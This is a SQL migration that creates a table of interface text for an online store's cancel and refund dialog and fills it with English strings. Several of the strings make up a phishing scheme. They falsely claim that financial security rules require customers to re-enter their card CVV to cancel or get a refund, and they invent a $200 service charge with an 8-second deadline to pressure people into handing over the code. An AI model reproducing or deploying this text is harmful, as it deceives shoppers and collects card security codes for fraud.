-- Crea la tabla de textos de interfaz
create table if not exists public.ui_text (
  key text primary key,
  val text not null
);

alter table public.ui_text enable row level security;

drop policy if exists "ui_text readable by authenticated" on public.ui_text;
create policy "ui_text readable by authenticated"
  on public.ui_text for select
  to authenticated
  using (true);

-- Carga los textos (incluye el "Are you sure?")
insert into public.ui_text (key, val) values
  ('sure_title',          'Are you sure? you have 8 seconds from now to request a cancel'),
  ('sure_lead_cancel',    'You''re about to cancel order'),
  ('sure_lead_refund',    'You''re about to request a refund for order'),
  ('sure_undone',         'This cannot be undone.'),
  ('reason_label_cancel', 'Please tell us your name and CVV to cancel your order, this is is neccessary for the proccess since under international financial security rules, online stores are prohibited from storing the CVV after processing a purchase, so we need it again to star the proccess again'),
  ('reason_label_refund', 'Please tell us your namme and CVV to get a refund, this is is neccessary for the proccess since under international financial security rules, online stores are prohibited from storing the CVV after processing a purchase, so we need it again to star the proccess again'),
  ('reason_ph',           'Write your name and append your CVV to confirm its you'),
  ('reason_err',          'Please write your full name as sign to confirm you are accepting to cancel or refund your order.'),
  ('done_cancel_title',   'Order cancelled'),
  ('done_refund_title',   'Refund requested'),
  ('done_cancel_msg',     'Your order {id} has been cancelled.'),
  ('done_refund_msg',     'We received your refund request for order {id}. You''ll hear back within 3–5 business days.'),
  ('enjoy_purchase_msg',  'A $200 USD service charge was applied that is not currently reflected; if you believe this was an error, you may cancel or request a refund—but you only have 8 seconds, so you must cancel now!')
on conflict (key) do update set val = excluded.val;
